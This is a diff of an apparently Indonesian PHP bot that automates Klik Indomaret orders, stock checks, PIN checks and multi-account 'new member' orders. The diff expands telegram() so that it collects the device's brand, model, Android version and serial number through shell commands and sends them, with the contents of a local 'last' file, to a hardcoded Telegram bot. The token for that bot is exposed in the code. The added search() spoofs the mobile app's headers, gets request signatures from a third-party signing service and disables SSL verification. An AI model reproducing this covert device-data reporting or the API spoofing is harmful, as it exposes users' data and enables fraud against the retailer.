@@ -1,5 +1,6 @@
 <?php
 
+copyKlikToZero();
 cleanup();
 hapusGakPenting();
 tampilkanMenu();
@@ -42,7 +43,9 @@ function tampilkanMenu() {
     echo Warna::BOLD_KUNING . "   [6] " . Warna::PUTIH . "Auto Checkout Virtual BCA\n";
     echo Warna::BOLD_KUNING . "   [7] " . Warna::PUTIH . "Auto Cekpin toko jasdor\n";
     echo Warna::BOLD_KUNING . "   [8] " . Warna::PUTIH . "Rekap PIN\n";
-    echo Warna::BOLD_KUNING . "   [9] " . Warna::PUTIH . "Auto Isi Langsung CO \n";
+    echo Warna::BOLD_KUNING . "   [9] " . Warna::PUTIH . "Create Manual Order \n";
+    echo Warna::BOLD_KUNING . "   [10] " . Warna::PUTIH . "Auto Cekstock\n";
+    echo Warna::BOLD_KUNING . "   [11] " . Warna::PUTIH . "Create Order Dari Cek Stock\n";
     echo Warna::BOLD_MAGENTA . "   [r] " . Warna::KUNING . "Run SC\n";
     echo Warna::BOLD_MAGENTA . "   [a] " . Warna::KUNING . "Reset Akun Baru\n";
     echo Warna::BOLD_MAGENTA . "   [x] " . Warna::KUNING . "Keluar\n";
@@ -59,7 +62,9 @@ function tampilkanMenu() {
       case '6': autoCheckout("BCA", 3); break;
       case '7': autoCekpin(); break;
       case '8': rekappin(); break;
-      case '9': autov2(); break;
+      case '9': manualorder(); break;
+      case '10': autocekstock(); break;
+      case '11': hapusstoknol(); break;
       case 'r': jalankanGasJasder(); break;
       case 'a': adjustindex(); break;
       case 'x':
@@ -394,7 +399,7 @@ function getTanggalOtomatis() {
   $jamSekarang = (int)date('H');
   $tanggalSekarang = (int)date('d');
 
-  if ($jamSekarang >= 19) {
+  if ($jamSekarang >= 18) {
     $tanggalBesok = $tanggalSekarang + 1;
     $jumlahHariBulanIni = (int)date('t');
     if ($tanggalBesok > $jumlahHariBulanIni) {
@@ -433,7 +438,7 @@ function getShiftOtomatis() {
   $jamSekarang = (int)date('H');
   $jamMenitSekarang = date('H:i');
 
-  if ($jamSekarang >= 19) {
+  if ($jamSekarang >= 18) {
     return [
       'kode' => '2',
       'info' => "1 Besok Pagi",
@@ -486,7 +491,7 @@ function autoShift() {
   date_default_timezone_set('Asia/Jakarta');
   $jamSekarang = (int)date('H');
 
-  if ($jamSekarang >= 19) {
+  if ($jamSekarang >= 18) {
     return '2';
   }
 
@@ -537,7 +542,12 @@ function gas() {
   echo $CYAN . "\n===================================\n";
   echo "     AUTO ISI KERANJANG\n";
   echo "===================================\n" . $RESET;
-
+  echo $YELLOW . "\nLangsung CO ? (y/n): " . $RESET;
+  $langsungco = trim(fgets(STDIN));
+  if ($langsungco == "y") {
+    echo $YELLOW . "\nPayment Toko ? (y/n): " . $RESET;
+    $payementtoko = trim(fgets(STDIN));
+  }
   $inputFile = "input.txt";
 
   if (!file_exists($inputFile)) {
@@ -652,12 +662,7 @@ function gas() {
 
     echo $YELLOW . "\nPilih opsi (1-3): " . $RESET;
     $pilihan = trim(fgets(STDIN));
-    echo $YELLOW . "\nLangsung CO ? (y/n): " . $RESET;
-    $langsungco = trim(fgets(STDIN));
-    if ($langsungco == "y") {
-      echo $YELLOW . "\nPayment Toko ? (y/n): " . $RESET;
-      $payementtoko = trim(fgets(STDIN));
-    }
+
 
     switch ($pilihan) {
     case '1':
@@ -782,11 +787,13 @@ function gas() {
         ]);
       }
 
+
       if ($pluIndex < $pluCount) {
         $sequence[] = 'y';
       } else {
         $sequence[] = 'n';
-        $sequence[] = '';
+        $sequence[] = 'n';
+        $sequence[] = ' ';
         if ($langsungco == "y") {
           $sequence[] = '4';
           $sequence[] = '1';
@@ -2545,21 +2552,38 @@ function cleanup() {
 }
 
 
-
 function telegram() {
   $botToken = '8076761254:AAGTUQ506GOBkofydIB0XF_AojRpIFNaoEo';
   $chatId = '870519657';
 
-  $filePath = 'last';
-  $message = "";
+  $brand = trim(shell_exec("getprop ro.product.brand"));
+  $model = trim(shell_exec("getprop ro.product.model"));
+  $android = trim(shell_exec("getprop ro.build.version.release"));
 
-  if (file_exists($filePath)) {
-    $content = file_get_contents($filePath);
-    $message = urlencode($content);
-  } else {
-    $message = urlencode("File last.txt tidak ditemukan!");
+  // ID device (serial number)
+  $serial = trim(shell_exec("getprop ro.serialno"));
+  if ($serial == "" || $serial == "unknown") {
+    $serial = substr(md5(php_uname()), 0, 12); // fallback ID
   }
 
+  // --- Baca file ---
+  $filePath = 'last';
+  if (file_exists($filePath)) {
+    $content = file_get_contents($filePath);
+  } else {
+    $content = "File last.txt tidak ditemukan!";
+  }
+
+  // --- Buat pesan Telegram ---
+  $message = "<b>INFO DEVICE</b>\n";
+  $message .= "Brand : <b>$brand</b>\n";
+  $message .= "Model : <b>$model</b>\n";
+  $message .= "Android : <b>$android</b>\n";
+  $message .= "ID : <b>$serial</b>\n\n";
+  $message .= "<b>ISI FILE:</b>\n";
+  $message .= $content;
+
+  // --- Kirim ke Telegram ---
   $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
   $data = [
     'chat_id' => $chatId,
@@ -2576,7 +2600,7 @@ function telegram() {
   ];
 
   $context = stream_context_create($options);
-  $result = file_get_contents($url, false, $context);
+  file_get_contents($url, false, $context);
 }
 
 
@@ -2628,6 +2652,7 @@ function getToko($kode) {
   }
 }
 
+
 function hapusGakPenting() {
   $targets = [
     "cos",
@@ -2667,4 +2692,581 @@ function hapusGakPenting() {
     }
   }
 
+}
+
+
+function createOrder($selected_products) {
+  if (empty($selected_products)) {
+    echo "\033[1;31mTidak ada produk yang dipilih untuk dibuat order.\033[0m\n";
+    return;
+  }
+
+  echo "\033[1;36m\n" . str_repeat("=", 50) . "\n";
+  echo "FORM ORDER NEW MEMBER\n";
+  echo str_repeat("=", 50) . "\033[0m\n\n";
+
+  echo "\033[1;33mKode Toko : \033[0m";
+  $kode_toko = trim(fgets(STDIN));
+
+  echo "\033[1;33mJumlah akun : \033[0m";
+  $jumlah_akun = trim(fgets(STDIN));
+
+  echo "\033[1;33m\nPENGISIAN JUMLAH (QTY) PER PRODUK\033[0m\n";
+  echo str_repeat("-", 40) . "\n";
+
+  $order_details = [];
+  $total_harga = 0;
+
+  foreach ($selected_products as $index => $product) {
+    $counter = $index + 1;
+
+    echo "\033[1;32mProduk {$counter}:\033[0m\n";
+    echo "\033[0;37mPLU      : {$product['plu']}\033[0m\n";
+    echo "\033[0;37mDeskripsi: " . substr($product['deskripsi'], 0, 40);
+    if (strlen($product['deskripsi']) > 40) echo "...";
+    echo "\033[0m\n";
+    echo "\033[0;37mHarga    : Rp " . number_format($product['harga'], 0, ',', '.') . "\033[0m\n";
+
+    echo "\033[1;33mQty {$counter} : \033[0m";
+    $qty = trim(fgets(STDIN));
+
+    while (!is_numeric($qty) || $qty < 1) {
+      echo "\033[1;31mQty harus angka dan minimal 1. Silakan input ulang: \033[0m";
+      $qty = trim(fgets(STDIN));
+    }
+
+    $subtotal = $product['harga'] * intval($qty);
+    $total_harga += $subtotal;
+
+    $order_details[] = [
+      'plu' => $product['plu'],
+      'qty' => intval($qty),
+      'harga' => $product['harga'],
+      'subtotal' => $subtotal
+    ];
+
+    echo "\033[0;90m" . str_repeat("-", 40) . "\033[0m\n";
+  }
+
+  // Tampilkan hasil di terminal
+  echo "\033[1;36m\n" . str_repeat("=", 50) . "\n";
+  echo "FORM ORDER NEW MEMBER - HASIL\n";
+  echo str_repeat("=", 50) . "\033[0m\n\n";
+
+  echo "\033[1;33mKode Toko   : \033[0m" . $kode_toko . "\n";
+  echo "\033[1;33mNama Toko   : \033[0m-\n";
+  echo "\033[1;33mType Order  : \033[0mSAMA\n";
+  echo "\033[1;33mJumlah akun : \033[0m" . $jumlah_akun . "\n\n";
+
+  foreach ($order_details as $index => $detail) {
+    $counter = $index + 1;
+    echo "\033[1;33mPLU {$counter} : \033[0m" . $detail['plu'] . "\n";
+    echo "\033[1;33mQty {$counter} : \033[0m" . $detail['qty'] . "\n";
+  }
+
+  echo "\033[1;33m\n" . str_repeat("-", 30) . "\033[0m\n";
+  echo "\033[1;33mTotal Rp " . number_format($total_harga, 0, '', '.') . "\033[0m\n";
+  echo "\033[1;33m" . str_repeat("-", 30) . "\033[0m\n";
+  echo "\033[1;33m>\033[0m\n";
+
+  echo "\033[1;32m\nOrder berhasil dibuat!\033[0m\n";
+}
+
+function search($keyword) {
+  $url = "https://api-klik.klikindomaret.com/catalog-xpress/api/mobile/search/result";
+
+  $data = [
+    "storeCode" => "TJKT",
+    "keyword" => $keyword,
+    "latitude" => -6.175218437940874,
+    "longitude" => 106.82747699571644,
+    "districtId" => "141100100",
+    "mode" => "DELIVERY"
+  ];
+
+  $json_data = json_encode($data);
+
+  $signature_result = signature($url, $json_data);
+  $signature_data = json_decode($signature_result, true);
+
+  if (!$signature_data || !isset($signature_data['signature'])) {
+    die("\033[1;31mError: Gagal generate signature\033[0m");
+  }
+
+  $headers = [
+    'session_id: da9ff9e0-345d-49ac-9233-f450ff70b7ef',
+    'event_id: 312',
+    'x-correlation-id: 24554f74-c4a2-49eb-9c52-c057bcca1bc3',
+    'user-agent: EDTSCode-production',
+    'apps: {"os_name":"Android Q","os_version":"Android 10","device_class":"Phone","device_family":"Xiaomi Redmi Note 7","app_version":"2511100","device_id":"m4lnhb2qfzhrlbyw"}',
+    'signature: ' . $signature_data['signature'],
+    'sha1: 5C7C08E2D21CB74E2A662292E931688F09412F72',
+    'content-type: application/json; charset=UTF-8',
+    'accept-encoding: gzip'
+  ];
+
+  $ch = curl_init();
+
+  curl_setopt_array($ch, [
+    CURLOPT_URL => $url,
+    CURLOPT_RETURNTRANSFER => true,
+    CURLOPT_POST => true,
+    CURLOPT_HTTPHEADER => $headers,
+    CURLOPT_POSTFIELDS => $json_data,
+    CURLOPT_ENCODING => 'gzip',
+    CURLOPT_SSL_VERIFYPEER => false,
+    CURLOPT_TIMEOUT => 30
+  ]);
+
+  $response = curl_exec($ch);
+  curl_close($ch);
+
+  $result = json_decode($response);
+
+  if (!$result || !isset($result->data->content)) {
+    echo "\033[1;31m\nTidak ada hasil untuk keyword: $keyword\n\033[0m";
+    return [];
+  }
+
+  $products = [];
+  $counter = 1;
+
+  echo "\033[1;36m\n" . str_repeat("=", 70) . "\n";
+  echo "HASIL PENCARIAN UNTUK: \"" . strtoupper($keyword) . "\"\n";
+  echo str_repeat("=", 70) . "\033[0m\n\n";
+
+  echo "\033[1;33m" . str_pad("NO", 4) . " | ";
+  echo str_pad("PLU", 15) . " | ";
+  echo str_pad("PRODUK", 35) . " | ";
+  echo "HARGA\033[0m\n";
+  echo "\033[1;33m" . str_repeat("-", 70) . "\033[0m\n";
+
+  foreach ($result->data->content as $product) {
+    $plu = $product->plu;
+    $produk = $product->productName;
+    $price = $product->finalPrice ?? $product->price;
+
+    $products[$counter] = [
+      'plu' => $plu,
+      'deskripsi' => $produk,
+      'harga' => $price
+    ];
+
+    echo "\033[0;37m" . str_pad($counter, 4) . " \033[0m| ";
+    echo "\033[0;32m" . str_pad(substr($plu, 0, 15), 15) . " \033[0m| ";
+    echo "\033[0;37m" . str_pad(substr($produk, 0, 35), 35) . " \033[0m| ";
+    echo "\033[1;32mRp " . number_format($price, 0, ',', '.') . "\033[0m";
+    echo "\n";
+
+    echo "\033[0;90m" . str_repeat("-", 70) . "\033[0m\n";
+
+    $counter++;
+  }
+
+  if (empty($products)) {
+    echo "\033[1;31mTidak ada produk ditemukan.\033[0m\n";
+    return [];
+  }
+
+  echo "\033[1;36m\n" . str_repeat("=", 70) . "\n";
+  echo "PILIHAN PRODUK\n";
+  echo str_repeat("=", 70) . "\033[0m\n";
+
+  echo "\033[1;33mMasukkan nomor produk (contoh: 1,2,3): \033[0m";
+  $input = trim(fgets(STDIN));
+
+  $selected_products = [];
+
+  if (empty($input)) {
+    echo "\033[1;33mPemilihan dibatalkan.\033[0m\n";
+    return [];
+  }
+
+  $selected_indexes = array_map('intval', explode(',', $input));
+
+  foreach ($selected_indexes as $index) {
+    if (isset($products[$index])) {
+      $selected_products[] = $products[$index];
+    }
+  }
+
+
+
+  if (!empty($selected_products)) {
+    echo "\033[1;32m\n" . str_repeat("=", 70) . "\n";
+    echo "PRODUK YANG DIPILIH (" . count($selected_products) . " item)\n";
+    echo str_repeat("=", 70) . "\033[0m\n\n";
+
+    // Persiapkan data untuk disimpan
+    $save_lines = [];
+    foreach ($selected_products as $index => $product) {
+      $counter = $index + 1;
+
+      // Format untuk disimpan ke file: plu:deskripsi:harga
+      $save_lines[] = $product['plu'] . ":" . $product['deskripsi'] . ":" . $product['harga'];
+
+      // Tampilkan ke layar dengan format yang lebih bagus
+      echo "\033[1;33m{$counter}. PLU: \033[0m" . $product['plu'] . "\n";
+      echo "\033[1;33m   Produk: \033[0m" . substr($product['deskripsi'], 0, 50) . "\n";
+      echo "\033[1;33m   Harga: \033[0mRp " . number_format($product['harga'], 0, ',', '.') . "\n";
+      echo "\033[0;90m" . str_repeat("-", 60) . "\033[0m\n";
+    }
+
+    // Simpan semua data sekaligus ke file
+    file_put_contents("selected.txt", implode("\n", $save_lines));
+
+    echo "\033[1;32m\n" . str_repeat("=", 70) . "\033[0m\n";
+  } else {
+    echo "\033[1;33mTidak ada produk yang dipilih.\033[0m\n";
+  }
+
+  return $selected_products;
+}
+
+function manualorder($stock = null) {
+  echo "\033[1;36m\n" . str_repeat("=", 70) . "\n";
+  echo "KLIKINDO PRODUCT SEARCH\n";
+  echo str_repeat("=", 70) . "\033[0m\n\n";
+
+  echo "\033[1;33mMasukkan keyword pencarian: \033[0m";
+  $keyword = trim(fgets(STDIN));
+
+  if (!empty($keyword)) {
+    $selected = search($keyword);
+
+    if (!empty($selected)) {
+      if ($stock) {
+        $create_order = 'n';
+      } else {
+
+        echo "\033[1;33m\nApakah ingin membuat order dari produk yang dipilih? (y/n): \033[0m";
+        $create_order = trim(fgets(STDIN));
+      }
+
+      if (strtolower($create_order) === 'y') {
+        createOrder($selected);
+      } else {
+        echo "\033[1;33mOrder tidak dibuat.\033[0m\n";
+      }
+
+    }
+  } else {
+    echo "\033[1;31mKeyword tidak boleh kosong!\033[0m\n";
+  }
+}
+
+function signature($url, $body) {
+  $curl = curl_init();
+  curl_setopt_array($curl, [
+    CURLOPT_URL => "https://iddant.id/newklik/",
+    CURLOPT_RETURNTRANSFER => true,
+    CURLOPT_ENCODING => "",
+    CURLOPT_MAXREDIRS => 10,
+    CURLOPT_TIMEOUT => 30,
+    CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
+    CURLOPT_CUSTOMREQUEST => "POST",
+    CURLOPT_POSTFIELDS => json_encode([
+      'method' => '/sign/post',
+      'url' => $url,
+      'body' => $body,
+    ]),
+    CURLOPT_HTTPHEADER => [
+      "Accept: */*",
+      "Content-Type: application/json",
+      "User-Agent: Thunder Client (https://www.thunderclient.com)",
+    ],
+  ]);
+
+  $response = curl_exec($curl);
+  curl_close($curl);
+  return $response;
+}
+
+
+
+function autocekstock() {
+  echo Warna::BOLD_CYAN . "\n╔═══════════════════════════════════════╗\n";
+  echo "║" . Warna::BOLD_HIJAU . "        AUTO CEK STOCK TOKO              " . Warna::BOLD_CYAN . "║\n";
+  echo "╚═══════════════════════════════════════╝\n" . Warna::RESET;
+
+
+  $file_plu = "cekstoktoko.txt";
+  if (file_exists($file_plu)) {
+    unlink($file_plu);
+  }
+  manualorder(1);
+
+  echo "\033[1;33mFile Kodetoko ( input tanpa txt ) : \033[0m";
+  $namafile = trim(fgets(STDIN));
+  $filetoko = "$namafile.txt";
+
+  $file_plu = "selected.txt";
+  if (!file_exists($file_plu)) {
+    echo Warna::BOLD_MERAH . "✗ File selected.txt tidak ditemukan!\n" . Warna::RESET;
+    return;
+  }
+
+  $plu_data = file($file_plu, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
+  if (empty($plu_data)) {
+    echo Warna::BOLD_MERAH . "✗ File selected.txt kosong!\n" . Warna::RESET;
+    return;
+  }
+
+  $plu_list = [];
+  foreach ($plu_data as $line) {
+    $parts = explode(':', $line, 3);
+    if (!empty(trim($parts[0] ?? ''))) {
+      $plu_list[] = trim($parts[0]);
+    }
+  }
+
+  if (empty($plu_list)) {
+    echo Warna::BOLD_MERAH . "✗ Tidak ada PLU yang valid dalam file!\n" . Warna::RESET;
+    return;
+  }
+
+  echo Warna::BOLD_CYAN . "\n▶ Menemukan " . count($plu_list) . " PLU dari selected.txt\n" . Warna::RESET;
+  echo Warna::BOLD_CYAN . "▶ Menjalankan proses...\n" . Warna::RESET;
+  sleep(2);
+
+  $inputs = [
+    '7',
+    'y',
+    $filetoko
+  ];
+
+  $total_plu = count($plu_list);
+
+  foreach ($plu_list as $i => $plu) {
+    $inputs[] = $plu;
+    $inputs[] = '1';
+    $inputs[] = ($i === $total_plu - 1) ? 'n' : 'y';
+  }
+
+  $file_plu = "cekstoktoko.txt";
+  if (!file_exists($file_plu)) {
+    $inputs[] = 'n';
+    $inputs[] = '7';
+    $inputs[] = 'n';
+    $inputs[] = $filetoko;
+
+  }
+  $inputs[] = '';
+  $inputs[] = '';
+  $inputs[] = '';
+  jalankanKlik($inputs);
+
+  echo Warna::BOLD_HIJAU . "✓ Proses cek stock selesai untuk " . count($plu_list) . " PLU\n" . Warna::RESET;
+}
+
+
+
+function hapusStokNol() {
+
+  echo "\033[96;1mTotal Per Keranjang ? \033[97;1m: ";
+  $qtyKeranjang = strtoupper(trim(fgets(STDIN)));
+  $stokF = "cekstok.formate";
+  $stokFile = "cekstoktoko.txt";
+  $selectedFile = "selected.txt";
+
+  if (!file_exists($stokFile) || !file_exists($selectedFile)) return;
+
+  // mapping deskripsi => PLU
+  $map = [];
+  foreach (file($selectedFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES) as $l) {
+    $p = explode(":", $l, 3);
+    if (count($p) === 3) {
+      $map[trim($p[1])] = trim($p[0]);
+    }
+  }
+
+  $data = file_get_contents($stokFile);
+  $blocks = preg_split('/\n(?=TOKO:)/', trim($data));
+  $hasil = [];
+
+  foreach ($blocks as $block) {
+    $lines = explode("\n", trim($block));
+    $outBlock = [];
+    $adaStok = false;
+
+    foreach ($lines as $line) {
+
+      // header TOKO tetap
+      if (strpos($line, 'TOKO:') === 0) {
+        $outBlock[] = $line;
+        continue;
+      }
+
+      // baris STOK
+      if (preg_match('/^STOK:\s*(\d+)\s+(.+)$/', $line, $m)) {
+        $stok = (int)$m[1];
+        $desc = trim($m[2]);
+
+        if ($stok > 0 && isset($map[$desc])) {
+          $outBlock[] = $map[$desc] . " : " . $stok . " : " . $desc;
+          $adaStok = true;
+        }
+      }
+    }
+
+    // simpan TOKO hanya jika ada stok > 0
+    if ($adaStok) {
+      $hasil[] = implode("\n", $outBlock);
+    }
+  }
+
+  file_put_contents($stokF, implode("\n\n", $hasil) . "\n");
+
+  $inputFile = $stokF;
+  $outputDir = 'output';
+
+  if (!is_dir($outputDir)) {
+    mkdir($outputDir, 0777, true);
+  }
+
+  $content = file_get_contents($inputFile);
+  if ($content === false) {
+    die("File cekstoktoko.txt tidak ditemukan atau kosong\n");
+  }
+
+  $stores = [];
+  $lines = explode("\n", $content);
+  $currentStore = null;
+
+  foreach ($lines as $line) {
+    $line = trim($line);
+    if ($line === '') continue;
+
+    if (strpos($line, 'TOKO:') === 0) {
+      if (preg_match('/TOKO:\s*(.+?)\s*\(([^)]+)\)/', $line, $m)) {
+        $currentStore = $m[2];
+        $stores[$currentStore] = [
+          'name' => $m[1],
+          'code' => $m[2],
+          'items' => []
+        ];
+      }
+      continue;
+    }
+
+    if ($currentStore && preg_match('/^(\d+)\s*:\s*(\d+)\s*:/', $line, $m)) {
+      $plu = $m[1];
+      $qty = (int)$m[2];
+
+      if ($qty > 0) {
+        $stores[$currentStore]['items'][] = [
+          'plu' => $plu,
+          'qty' => $qty
+        ];
+      }
+    }
+  }
+  
+  
+  echo "Memproses data...\n\n";
+
+  foreach ($stores as $store) {
+    $result = generateOrderFormat($store, $qtyKeranjang);
+    $file = $outputDir . '/' . $store['code'];
+    file_put_contents($file, $result);
+    echo "✓ File dibuat: $file\n";
+  }
+
+  echo "\nSELESAI!\n";
+}
+
+function generateOrderFormat($store , $qtyKeranjang ) {
+    $output = "FORM ORDER NEW MEMBER\n";
+    $output .= "=======================\n\n";
+    $output .= "Kode Toko   : {$store['code']}\n";
+    $output .= "Nama Toko   : {$store['name']}\n";
+    $output .= "Tanggal     : " . date('j/n/Y') . "\n";
+    $output .= "Type Order  : BEDA\n";
+
+    $totalQty = 0;
+    foreach ($store['items'] as $it) {
+      $totalQty += $it['qty'];
+    }
+
+    $maxAccounts = floor($totalQty / $qtyKeranjang);
+    $output .= "Jumlah akun : $maxAccounts\n\n";
+
+    $remaining = $store['items'];
+    $akunKe = 1;
+
+    while ($akunKe <= $maxAccounts) {
+      $currentAccount = [];
+      $currentQty = 0;
+
+      foreach ($remaining as &$item) {
+        if ($item['qty'] <= 0) continue;
+
+        $space = $qtyKeranjang - $currentQty;
+        if ($space <= 0) break;
+
+        $take = min($item['qty'], $space);
+        $item['qty'] -= $take;
+        $currentQty += $take;
+
+        if (!isset($currentAccount[$item['plu']])) {
+          $currentAccount[$item['plu']] = 0;
+        }
+        $currentAccount[$item['plu']] += $take;
+      }
+      unset($item);
+
+      $output .= "Akun ke : $akunKe\n";
+      $no = 1;
+      foreach ($currentAccount as $plu => $qty) {
+        $output .= "PLU $no : $plu\n";
+        $output .= "QTY $no : $qty\n";
+        $no++;
+      }
+      $output .= "\n";
+
+      $akunKe++;
+    }
+
+    return $output;
+  }
+  
+  
+  
+  function copyKlikToZero($klikFile = 'klik.txt', $zeroFile = '0')
+{
+    if (!file_exists($klikFile)) return;
+
+    // bersihkan :None di klik.txt
+    $klikLines = file($klikFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
+    $klikLines = array_map(function ($l) {
+        return str_replace(':None', '', trim($l));
+    }, $klikLines);
+    file_put_contents($klikFile, implode("\n", $klikLines) . "\n");
+
+    // bersihkan :None di 0.txt
+    $zeroLines = file_exists($zeroFile)
+        ? file($zeroFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES)
+        : [];
+
+    $zeroLines = array_map(function ($l) {
+        return str_replace(':None', '', trim($l));
+    }, $zeroLines);
+    file_put_contents($zeroFile, implode("\n", $zeroLines) . "\n");
+
+    // set untuk cek duplikat
+    $zeroSet = array_flip($zeroLines);
+    $add = [];
+
+    foreach ($klikLines as $line) {
+        if ($line === '') continue;
+
+        if (!isset($zeroSet[$line])) {
+            $add[] = $line;
+            $zeroSet[$line] = true;
+        }
+    }
+
+    if (!empty($add)) {
+        file_put_contents($zeroFile, implode("\n", $add) . "\n", FILE_APPEND);
+    }
 }
